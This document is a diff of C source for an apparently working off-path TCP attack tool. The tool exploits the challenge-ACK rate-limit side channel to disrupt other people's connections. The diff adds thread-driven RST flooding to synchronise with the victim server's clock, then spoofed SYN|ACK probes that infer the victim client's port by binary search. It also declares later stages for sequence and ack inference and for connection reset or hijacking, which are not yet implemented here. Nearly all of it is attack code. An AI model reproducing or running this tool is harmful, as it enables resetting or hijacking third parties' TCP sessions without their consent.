@@ -44,6 +44,16 @@
 #include "router.h"
 
 
+/* attack state tracking */
+typedef enum {
+	AS_SYNC = 0,
+	AS_TUPLE_INFERENCE,
+	AS_SEQ_INFERENCE,
+	AS_ACK_INFERENCE,
+	AS_INJECTION,
+	AS_SUCCESS
+} astate_t;
+
 /* TCP connection tracking */
 typedef enum {
 	CS_NEW = 0,
@@ -59,6 +69,11 @@ const char *g_conn_states[] = {
 	"FIN"
 };
 
+typedef struct packet_struct {
+	u_char *buf;
+	size_t len;
+} packet_t;
+
 typedef struct conn_struct {
 	cstate_t state;
 	u_short id;
@@ -72,15 +87,18 @@ typedef struct conn_struct {
 typedef struct thctx_struct {
 	pcap_t *pch;
 	int ipoff;
-	conn_t *conn;
-	void *packet;
-	size_t pktlen;
+	conn_t conn_legit;
+	conn_t conn_spoof;
+	struct sockaddr_in *cli;
+	packet_t *pkt;
+	int numpkts;
+	suseconds_t delay;
 } thctx_t;
 
 /* global count for challange ACKs received in one period */
-static int g_chack_cnt = 0;
+static volatile int g_chack_cnt = 0;
 /* global context for threads operating on pkts */
-thctx_t g_ctx;
+static volatile thctx_t g_ctx;
 
 /*
  * if DEVICE is not defined, we'll try to find a suitable device..
@@ -90,13 +108,13 @@ thctx_t g_ctx;
 
 
 /* prototypes.. */
-int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli);
+int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli);
 
 u_short in_cksum(u_short *addr, size_t len);
-void tcp_init(conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq);
-int tcp_craft(void *output, size_t *outlen, conn_t *pconn, u_char flags, char *data, size_t len);
-int tcp_send(pcap_t *pch, conn_t *pconn, u_char flags, char *data, size_t len);
-int tcp_recv(struct pcap_pkthdr *pph, int ipoff, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
+void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq);
+int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len);
+int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len);
+int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
 #ifdef DEBUG_SEQ
 	, cstate_t conn_state
 #endif
@@ -143,6 +161,8 @@ int main(int argc, char *argv[])
 		}
 		cliaddr.sin_port = htons(cliport);
 	}
+	else
+		cliaddr.sin_port = 0;
 
 	/* make sure the target port is valid */
 	srvport = atoi(argv[2]);
@@ -163,8 +183,15 @@ int main(int argc, char *argv[])
 	if (!lookup_host(myhost, &myaddr))
 		return 1;
 
+	printf("[*] Launching off-path challenge ACK attack against:\n"
+			"    server: %s:%u\n", inet_ntoa(srvaddr.sin_addr),
+			ntohs(srvaddr.sin_port));
+	printf("    client: %s (port hint: %u)\n", inet_ntoa(cliaddr.sin_addr),
+			ntohs(cliaddr.sin_port));
+	printf("    from: %s\n", inet_ntoa(myaddr.sin_addr));
+
 	/* here we go.. WOOO */
-	return execute_attack(&myaddr, &srvaddr, &cliaddr);
+	return set_up_attack(&myaddr, &srvaddr, &cliaddr);
 }
 
 
@@ -275,23 +302,28 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2
  */
 void *send_thread(void *arg)
 {
-	thctx_t *pctx;
 	struct timeval start, now, diff;
 	int j;
 
-	pctx = (thctx_t *)arg;
+	while (1) {
+#if 0
+		if (g_ctx.numpkts > 0)
+			printf("[*] Sending %d packets...\n", g_ctx.numpkts);
+#endif
+		while (g_ctx.numpkts > 0) {
+			gettimeofday(&start, NULL);
 
-	//printf("[*] Sending 200 RSTs...\n");
-	for (j = 0; j < 200; j++) {
-		gettimeofday(&start, NULL);
+			pcap_sendpacket(g_ctx.pch, (void *)g_ctx.pkt->buf, g_ctx.pkt->len);
 
-		pcap_sendpacket(pctx->pch, (void *)pctx->packet, pctx->pktlen);
+			g_ctx.numpkts--;
 
-		do {
-			gettimeofday(&now, NULL);
-			timersub(&now, &start, &diff);
-		} while (diff.tv_usec < 5000);
-		//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
+			do {
+				gettimeofday(&now, NULL);
+				timersub(&now, &start, &diff);
+			} while (diff.tv_usec < g_ctx.delay);
+			//printf("%d %lu %lu\n", g_ctx.numpkts, diff.tv_sec, diff.tv_usec);
+		}
+		usleep(250);
 	}
 	return NULL;
 }
@@ -302,22 +334,19 @@ void *send_thread(void *arg)
 
 void *recv_thread(void *arg)
 {
-	thctx_t *pctx;
 	struct pcap_pkthdr *pchdr = NULL;
 	const u_char *inbuf = NULL;
 	int pcret;
 	u_char flags;
 	size_t datalen;
 
-	pctx = (thctx_t *)arg;
-
 	/* listen for challenge ACKs and count them */
 	while (1) {
-		pcret = pcap_next_ex(pctx->pch, &pchdr, &inbuf);
+		pcret = pcap_next_ex(g_ctx.pch, &pchdr, &inbuf);
 		if (pcret == 1
-			&& tcp_recv(pchdr, pctx->ipoff, inbuf, &flags, NULL, NULL, NULL, &datalen
+			&& tcp_recv(pchdr, inbuf, &flags, NULL, NULL, NULL, &datalen
 #ifdef DEBUG_SEQ
-				, pctx->conn->state
+				, g_ctx.conn->state
 #endif
 				)
 			&& flags == TH_ACK) {
@@ -331,138 +360,286 @@ void *recv_thread(void *arg)
 
 
 /*
- * to conduct the attack, we need to synchronize with the remote system's clock
+ * conduct the attack:
+ * 1. synchronize with remote clock
+ * 2. infer four-tuple
+ * 3. infer sequence number
+ * 4. infer ack number
+ * 5. reset/hijack
+ * 6. profit?
  *
- * 1. send 200 in-window RSTs spaced evenly
- * 2. count the challenge ACKs returned
- * 3. adjust accordingly
- * 4. confirm
- *
- * the goal is exactly 100 challenge ACKs received...
  */
-int sync_time_with_remote(thctx_t *pctx)
+int conduct_offpath_attack(void)
 {
 	int chack_cnt[4] = { 0 };
 	int i, round = 0;
 	u_long old_seq;
-	char packet[8192];
-	size_t pktlen = sizeof(packet) - 14;
+	packet_t rst_pkt;
 	pthread_t sth, rth;
 	struct timeval start, now, diff;
+	astate_t attack_state = AS_SYNC;
+	volatile conn_t *legit, *spoof;
+	// ... "the default range on Linux is only from 32768 to 61000"
+	u_short guess_start = 0, guess_end = 0, guess_mid = 0;
+
+	legit = &(g_ctx.conn_legit);
+	spoof = &(g_ctx.conn_spoof);
 
 	/* generate the packet we'll send over and over to elicit challenge ACKs */
-	old_seq = pctx->conn->seq;
-	pctx->conn->seq += 5000;
-	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", 14);
-	if (!tcp_craft(packet + 14, &pktlen, pctx->conn, TH_RST, NULL, 0))
+	old_seq = legit->seq;
+	legit->seq += 5000;
+	rst_pkt.len = 8192;
+	rst_pkt.buf = malloc(rst_pkt.len);
+	memcpy(rst_pkt.buf, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
+	if (!tcp_craft(rst_pkt.buf + g_ctx.ipoff, &rst_pkt.len, legit, TH_RST, NULL, 0))
 		return 0;
-	pktlen += 14;
-	pctx->conn->seq = old_seq;
-
-	pctx->packet = packet;
-	pctx->pktlen = pktlen;
+	rst_pkt.len += g_ctx.ipoff;
+	legit->seq = old_seq;
 
 	/* spawn the recv thread first
 	 * it will live throughout the attack process...
 	 */
-	if (pthread_create(&rth, NULL, recv_thread, pctx)) {
+	if (pthread_create(&rth, NULL, recv_thread, NULL)) {
 		fprintf(stderr, "[!] failed to start recv thread!\n");
 		return 0;
 	}
 
-	while (1) {
+	/* spawn the send thread */
+	if (pthread_create(&sth, NULL, send_thread, NULL)) {
+		fprintf(stderr, "[!] failed to start send thread!\n");
+		pthread_cancel(rth);
+		return 0;
+	}
+
+	while (attack_state != AS_SUCCESS) {
 		struct timeval round_start;
 
 		gettimeofday(&round_start, NULL);
 
-		/* spawn the send thread */
-		if (pthread_create(&sth, NULL, send_thread, pctx)) {
-			fprintf(stderr, "[!] failed to start send thread!\n");
-			pthread_cancel(rth);
+		g_ctx.delay = 5000;
+
+		if (g_chack_cnt > 0) {
+			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
 			return 0;
 		}
 
-		/* wait for the send thread to terminate (it should terminate first) */
-		if (pthread_join(sth, NULL)) {
-			fprintf(stderr, "[!] failed to join send thread!\n");
-			pthread_cancel(rth);
-			return 0;
-		}
-
-		/* wait for 2 seconds for challenge ACKs... */
-		do {
-			//printf("  ACKs recv'd: %d\n", g_chack_cnt);
-			//usleep(250000);
+		/* stage 1 */
+		if (attack_state == AS_SYNC) {
+			/*
+			 * 1. send 200 in-window RSTs spaced evenly
+			 * 2. count the challenge ACKs returned
+			 * 3. adjust accordingly
+			 * 4. confirm
+			 *
+			 * the goal is exactly 100 challenge ACKs received...
+			 */
+			g_ctx.pkt = &rst_pkt;
+			g_ctx.numpkts = 200;
+			while (g_ctx.numpkts > 0)
+				usleep(250);
+#ifdef DEBUG_SEND_TIME
 			gettimeofday(&now, NULL);
 			timersub(&now, &round_start, &diff);
-		} while (diff.tv_sec < 2);
-		//printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+			printf("  send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
 
-		/* the delay before next round starts here.. */
-		memcpy(&start, &now, sizeof(start));
+			/* wait for 2 seconds for challenge ACKs... */
+			do {
+				usleep(250);
+				gettimeofday(&now, NULL);
+				timersub(&now, &round_start, &diff);
+			} while (diff.tv_sec < 2);
+#ifdef DEBUG_RECV_TIME
+			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
 
-		chack_cnt[round] = g_chack_cnt;
-		g_chack_cnt = 0;
-		printf("[*] Round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
+			/* the delay before next round starts here.. */
+			memcpy(&start, &now, sizeof(start));
 
-		/* did we synch?? */
-		if (chack_cnt[round] == 100) {
-			if (round == 2) {
-				/* verify... */
-				round++;
+			chack_cnt[round] = g_chack_cnt;
+			g_chack_cnt = 0;
+			printf("[*] Round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
+
+			/* did we synch?? */
+			if (chack_cnt[round] == 100) {
+				if (round == 2) {
+					/* verify... */
+					round++;
+					continue;
+				}
+				else if (round == 3) {
+					/* verified! */
+					printf("[*] Time synchronization complete!\n");
+					attack_state = AS_TUPLE_INFERENCE;
+					continue;
+				}
+
+				/* we got luck! verify... */
+				round = 2;
 				continue;
 			}
-			else if (round == 3)
-				/* verified! */
-				break;
 
-			/* we got luck! verify... */
-			round = 2;
-			continue;
-		}
+			else if (chack_cnt[round] < 100) {
+				fprintf(stderr, "[!] invalid number of challenge ACKs! WTF?\n");
+				return 0;
+			}
 
-		else if (chack_cnt[round] < 100) {
-			fprintf(stderr, "[!] invalid number of challenge ACKs! WTF?\n");
-			return 0;
-		}
+			/* woot! */
+			else if (round < 2) {
+				/* round 1 -> round 2 : delay by 5ms */
+				uint64_t delay = 5000;
 
-		/* woot! */
-		else if (round < 2) {
-			/* round 1 -> round 2 : delay by 5ms */
-			uint64_t delay = 5000;
+				if (round == 1) {
+					/* round 2 -> round 3 : delay precisely */
+					if (chack_cnt[round] >= chack_cnt[0]) {
+						delay = (300 - chack_cnt[round]) * 5000;
+					} else {
+						delay = (chack_cnt[round] - 100) * 5000;
+					}
+				}
 
-			if (round == 1) {
-				/* round 2 -> round 3 : delay precisely */
-				if (chack_cnt[round] >= chack_cnt[0]) {
-					delay = (300 - chack_cnt[round]) * 5000;
-					//printf("delaying for %lu us (1)\n", delay);
-				} else {
-					delay = (chack_cnt[round] - 100) * 5000;
-					//printf("delaying for %lu us (2)\n", delay);
+				/* do the delay! */
+				//printf("delaying for %lu us\n", delay);
+				do {
+					usleep(250);
+					gettimeofday(&now, NULL);
+					timersub(&now, &start, &diff);
+#ifdef DEBUG_DELAY
+					printf("  delay progress %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+				} while ((uint64_t)diff.tv_usec < delay);
+#ifdef DEBUG_DELAY
+				printf("  delay finished %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+				round++;
+			} else {
+				/* start over :-/ */
+				fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
+				round = 0;
+			}
+
+		/* stage 2 */
+		} else if (attack_state == AS_TUPLE_INFERENCE) {
+			/*
+			 * send a SYN|ACK to try to illicit a challenge ACK for the
+			 * purported connection from our victim.
+			 */
+
+			/* if we need to initialize the ranges, do so now */
+			if (guess_mid == 0) {
+				/* if we already have a guess, try it first */
+				if (spoof->src->sin_port) {
+					/* if it hits, we set these equal to signify a win.
+					 *
+					 * we leave guess_mid set to 0 in case we missed..
+					 */
+					guess_start = guess_end = ntohs(spoof->src->sin_port);
+				}
+				/* no initial guess available... */
+				else {
+					/* initialize algorithm for port number checking */
+					// XXX: TODO: scale number of guesses per round based on feedback
+					guess_start = 32768;
+					guess_end = 65535;
 				}
 			}
 
-			/* do the delay! */
-			do {
+			/* send the packet(s)! */
+			if (spoof->src->sin_port) {
+				//printf("[*] tuple-infer: guessing port %u from hint\n", ntohs(spoof->src->sin_port));
+				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
+					return 0;
+				/* only send this once. */
+				spoof->src->sin_port = 0;
+			} else {
+				u_short guess;
+
+				guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
+				//printf("[*] tuple-infer: guessing port is in [%u - %u) (start: %u)\n", guess_mid, guess_end, guess_start);
+				for (guess = guess_mid; guess < guess_end; guess++) {
+					/* meh. we have to recalculate the tcp checksum to alter the source port */
+					spoof->src->sin_port = htons(guess);
+					if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
+						return 0;
+				}
+				spoof->src->sin_port = 0;
+#ifdef DEBUG_SPOOF_SEND
 				gettimeofday(&now, NULL);
-				timersub(&now, &start, &diff);
-			} while ((uint64_t)diff.tv_usec < delay);
-			round++;
-		} else {
-			/* start over :-/ */
-			fprintf(stderr, "[!] reached round %d without success, restarting...\n", round + 1);
-			round = 0;
+				timersub(&now, &round_start, &diff);
+				printf("  spoof send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+			}
+
+			/* send 100 RSTs */
+			g_ctx.numpkts = 100;
+			while (g_ctx.numpkts > 0)
+				usleep(250);
+			gettimeofday(&now, NULL);
+			timersub(&now, &round_start, &diff);
+#ifdef DEBUG_SEND_TIME
+			printf("  entire send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+			if (diff.tv_sec > 0) {
+				fprintf(stderr, "[!] OH NO! sending took too long!\n");
+				return 0;
+			}
+
+			/* get the number of challenge ACKs after 1 second */
+			do {
+				usleep(250);
+				gettimeofday(&now, NULL);
+				timersub(&now, &round_start, &diff);
+			} while (diff.tv_sec < 1);
+#ifdef DEBUG_RECV_TIME
+			printf("  recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+
+			//printf("[*] tuple-infer: got %d challenge ACKs!\n", g_chack_cnt);
+			printf("[*] tuple-infer: guessed port is in [%u - %u) (start: %u) - %d challenge ACKs - %s\n",
+					guess_mid, guess_end, guess_start,
+					g_chack_cnt, g_chack_cnt == 100 ? "NO" : "OK");
+
+			if (g_chack_cnt == 100) {
+				/* if we exhausted the range and still didn't find it, start over */
+				if (guess_start >= guess_end) {
+					/* FAIL! */
+					printf("[!] Exhausted port search, starting over...\n");
+					guess_start = guess_end = guess_mid = 0;
+				}
+				else
+					/* adjust range */
+					guess_end = guess_mid - 1;
+			} else if (g_chack_cnt == 99) {
+				/* if we only sent one guess this time, we won! */
+				if (guess_start == guess_end) {
+					/* special handling for hinted guess */
+					printf("[*] Guessed client port: %u\n", guess_start);
+					spoof->src->sin_port = ntohs(guess_start);
+					attack_state = AS_SEQ_INFERENCE;
+				} else if (guess_end - guess_mid == 1) {
+					/* we legitimately guessed it! */
+					printf("[*] Guessed client port: %u\n", guess_mid);
+					spoof->src->sin_port = ntohs(guess_mid);
+					attack_state = AS_SEQ_INFERENCE;
+				}
+				else
+					/* adjust range */
+					guess_start = guess_mid;
+			} else {
+				// XXX: TODO: scale number of guesses per round based on feedback
+				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+			}
+
+			g_chack_cnt = 0;
 		}
 	}
-
-	printf("[*] Time synchronization complete!\n");
 
 	return 1;
 }
 
 
 /*
- * this function does the dirty work.
+ * this function sets up the attack.
  *
  * it starts by opening a raw socket and starting to capture packets for the
  * legit connection.
@@ -473,20 +650,21 @@ int sync_time_with_remote(thctx_t *pctx)
  * session as needed.
  *
  * special keys while in the data loop:
- * control-U         (erase to beginning of line)
- * control-[ (Esc)   (closes connection and exits)
+ * control-U         erase to beginning of line
+ * control-[ (Esc)   closes connection and exits
+ * "start\n"         launches the offpath attack (after connected)
  */
-int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
+int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
 {
 	int lport = getpid() + 1000;
-	conn_t legit_conn;
-	int ipoff = 0;
 	pcap_t *pch = NULL;
 	struct pcap_pkthdr *pchdr = NULL;
 	const u_char *inbuf = NULL;
 	int pcret;
 	char outbuf[8192];
 	int outlen = 0;
+	volatile conn_t *pconn;
+	int ipoff;
 
 	printf("[*] Selected local port: %d\n", lport);
 
@@ -494,17 +672,22 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 		pcap_perror(pch, "[!] Unable to start packet capture");
 		return 1;
 	}
+	g_ctx.ipoff = ipoff;
 
 	/* set the local port */
 	ploc->sin_port = htons(lport);
 
-	/* first, make a legit connection to the server */
-	tcp_init(&legit_conn, ploc, psrv, getpid() * 3000);
-	if (!tcp_send(pch, &legit_conn, TH_SYN, NULL, 0))
-		return 1;
-	legit_conn.state = CS_SYN_SENT;
+	/* initialize the parts of the spoofed connection we know.. */
+	tcp_init(&(g_ctx.conn_spoof), pcli, psrv, 0);
 
-	while (legit_conn.state != CS_FINISHED) {
+	/* make a legit connection to the server */
+	pconn = &(g_ctx.conn_legit);
+	tcp_init(pconn, ploc, psrv, getpid() * 3000);
+	if (!tcp_send(pch, pconn, TH_SYN, NULL, 0))
+		return 1;
+	pconn->state = CS_SYN_SENT;
+
+	while (pconn->state != CS_FINISHED) {
 		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
 		//printf("[*] pcret: %d\n", pcret);
 
@@ -514,29 +697,28 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 			void *data;
 			size_t datalen;
 
-			if (tcp_recv(pchdr, ipoff, inbuf, &flags, &rack, &rseq, &data, &datalen
+			if (tcp_recv(pchdr, inbuf, &flags, &rack, &rseq, &data, &datalen
 #ifdef DEBUG_SEQ
-						, legit_conn.state
+						, pconn->state
 #endif
 						)) {
-				switch (legit_conn.state) {
+				switch (pconn->state) {
 
 					case CS_SYN_SENT:
 						/* see if we got a SYN|ACK */
 						if ((flags & TH_SYN) && (flags & TH_ACK)
-								&& rack == legit_conn.seq + 1) {
+								&& rack == pconn->seq + 1) {
 
 							//printf("[*] Got SYN|ACK with matching ACK num!\n");
 
 							/* we need to ACK the seq */
-							legit_conn.seq = rack;
-							legit_conn.ack = rseq + 1;
-							if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+							pconn->seq = rack;
+							pconn->ack = rseq + 1;
+							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
 								return 1;
-							legit_conn.state = CS_CONNECTED;
+							pconn->state = CS_CONNECTED;
 
-							printf("tcp handshake complete.. proceed with what you planned to do..\n");
-							printf("------------------------------------------------------------------------------\n");
+							printf("[*] TCP handshack complete! Entering interactive session...\n");
 							setterm(0);
 						}
 						break;
@@ -544,30 +726,30 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 					case CS_CONNECTED:
 						/* see if we got data from remote... */
 						if ((flags & TH_PUSH) && (flags & TH_ACK)
-								&& rack == legit_conn.seq) {
+								&& rack == pconn->seq) {
 							//printf("[*] PSH|ACK received (len %lu)\n", datalen);
 						}
 
 						/* they just ack'd what we sent only... */
-						else if (flags == TH_ACK && rack == legit_conn.seq) {
+						else if (flags == TH_ACK && rack == pconn->seq) {
 							//printf("[*] ACK received (len %lu)\n", datalen);
 						}
 
 						/* perhaps the remote said to shut down... */
 						else if (flags & TH_FIN) {
 							printf("[*] FIN received\n");
-							legit_conn.ack++;
-							if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+							pconn->ack++;
+							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
 								return 1;
-							if (!tcp_send(pch, &legit_conn, TH_FIN, NULL, 0))
+							if (!tcp_send(pch, pconn, TH_FIN, NULL, 0))
 								return 1;
-							legit_conn.state++;
+							pconn->state++;
 						}
 
 						else if (flags & TH_RST) {
-							if (rseq == legit_conn.ack) {
+							if (rseq == pconn->ack) {
 								printf("[*] RST received\n");
-								legit_conn.state++;
+								pconn->state++;
 							}
 							/* otherwise, drop the RST */
 						}
@@ -577,8 +759,8 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 						if (datalen > 0) {
 							write(fileno(stdout), data, datalen);
-							legit_conn.ack += datalen;
-							if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+							pconn->ack += datalen;
+							if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
 								return 1;
 						}
 
@@ -611,15 +793,14 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 						/* fill in most of the context */
 						g_ctx.pch = pch;
-						g_ctx.ipoff = ipoff;
-						g_ctx.conn = &legit_conn;
+						g_ctx.cli = pcli;
 
-						if (!sync_time_with_remote(&g_ctx))
-							fprintf(stderr, "[!] Failed to sync with reomte clock!\n");
-					} else {
-						if (!tcp_send(pch, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen))
+						if (!conduct_offpath_attack())
 							return 1;
-						legit_conn.seq += outlen;
+					} else {
+						if (!tcp_send(pch, pconn, TH_PUSH|TH_ACK, outbuf, outlen))
+							return 1;
+						pconn->seq += outlen;
 					}
 					outlen = 0;
 					break;
@@ -632,13 +813,13 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 				case 0x1b: // ^[ (ESC)
 					printf("[*] Connection closed.\n");
-					if (!tcp_send(pch, &legit_conn, TH_FIN, NULL, 0))
+					if (!tcp_send(pch, pconn, TH_FIN, NULL, 0))
 						return 1;
-					legit_conn.seq++;
+					pconn->seq++;
 					sleep(1);
-					if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+					if (!tcp_send(pch, pconn, TH_ACK, NULL, 0))
 						return 1;
-					legit_conn.state = CS_FINISHED;
+					pconn->state = CS_FINISHED;
 					break;
 
 				default:
@@ -657,7 +838,7 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 /*
  * initialize a connection structure from the parameters
  */
-void tcp_init(conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq)
+void tcp_init(volatile conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq)
 {
 	pconn->id = (getpid() + 1337) & 0xffff;
 	pconn->state = CS_NEW;
@@ -703,7 +884,7 @@ u_short in_cksum(u_short *addr, size_t len)
  * this is based on Matt Barrie's old non-working TCPseqnumpred.c
  * the problem with that program was not this function however..
  */
-int tcp_craft(void *output, size_t *outlen, conn_t *pconn, u_char flags, char *data, size_t len)
+int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags, char *data, size_t len)
 {
 	struct ip ip;
 	struct tcphdr tcp;
@@ -776,15 +957,15 @@ int tcp_craft(void *output, size_t *outlen, conn_t *pconn, u_char flags, char *d
 /*
  * craft and send a packet using libpcap
  */
-int tcp_send(pcap_t *pch, conn_t *pconn, u_char flags, char *data, size_t len)
+int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags, char *data, size_t len)
 {
 	char packet[8192];
-	size_t pktlen = sizeof(packet) - 14;
+	size_t pktlen = sizeof(packet) - g_ctx.ipoff;
 
-	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", 14);
-	if (!tcp_craft(packet + 14, &pktlen, pconn, flags, data, len))
+	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
+	if (!tcp_craft(packet + g_ctx.ipoff, &pktlen, pconn, flags, data, len))
 		return 0;
-	pktlen += 14;
+	pktlen += g_ctx.ipoff;
 
 	if (pcap_sendpacket(pch, (void *)packet, pktlen) == -1) {
 		fprintf(stderr, "[!] pcap_sendpacket failed!\n");
@@ -806,7 +987,7 @@ int tcp_send(pcap_t *pch, conn_t *pconn, u_char flags, char *data, size_t len)
  * process the packet captured by libpcap. if everything goes well, we return
  * the TCP flags, ack, seq, and data (w/len) to the caller.
  */
-int tcp_recv(struct pcap_pkthdr *pph, int ipoff, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
+int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
 #ifdef DEBUG_SEQ
 		, cstate_t conn_state
 #endif
@@ -817,26 +998,26 @@ int tcp_recv(struct pcap_pkthdr *pph, int ipoff, const void *inbuf, u_char *flag
 	void *ptr;
 	size_t iplen, tcplen, datalen;
 
-	if (pph->caplen < ipoff + sizeof(struct ip)) {
+	if (pph->caplen < g_ctx.ipoff + sizeof(struct ip)) {
 		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet!\n");
 		return 0;
 	}
-	ptr = (void *)inbuf + ipoff;
+	ptr = (void *)inbuf + g_ctx.ipoff;
 	pip = (struct ip *)ptr;
 	iplen = pip->ip_hl * 4;
-	if (pph->caplen < ipoff + iplen) {
+	if (pph->caplen < g_ctx.ipoff + iplen) {
 		fprintf(stderr, "[!] tcp_recv: too short to be an IP packet (w/options)!\n");
 		return 0;
 	}
 	ptr += iplen;
-	if (pph->caplen < ipoff + iplen + sizeof(struct tcphdr)) {
+	if (pph->caplen < g_ctx.ipoff + iplen + sizeof(struct tcphdr)) {
 		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet!\n");
 		return 0;
 	}
 	ptcp = (struct tcphdr *)ptr;
 	tcplen = ptcp->th_off * 4;
 	ptr += tcplen;
-	if (pph->caplen < ipoff + iplen + tcplen) {
+	if (pph->caplen < g_ctx.ipoff + iplen + tcplen) {
 		fprintf(stderr, "[!] tcp_recv: too short to be a TCP packet (w/options)!\n");
 		return 0;
 	}
@@ -922,18 +1103,14 @@ void setterm(int mode)
 	static struct termios tmp, old;
 	static int old_set = 0;
 
-	switch(mode) {
-		case 0:
-			tcgetattr(fileno(stdin), &tmp);
-			memcpy(&old, &tmp, sizeof(struct termios));
-			tmp.c_lflag &= ~ICANON;
-			tcsetattr(fileno(stdin), TCSANOW, &tmp);
-			old_set = 1;
-			break;
-		default:
-			if (old_set)
-				tcsetattr(fileno(stdin), TCSANOW, &old);
-			break;
+	if (mode == 0) {
+		tcgetattr(fileno(stdin), &tmp);
+		memcpy(&old, &tmp, sizeof(struct termios));
+		tmp.c_lflag &= ~ICANON;
+		tcsetattr(fileno(stdin), TCSANOW, &tmp);
+		old_set = 1;
+	} else if (old_set) {
+		tcsetattr(fileno(stdin), TCSANOW, &old);
 	}
 }
 
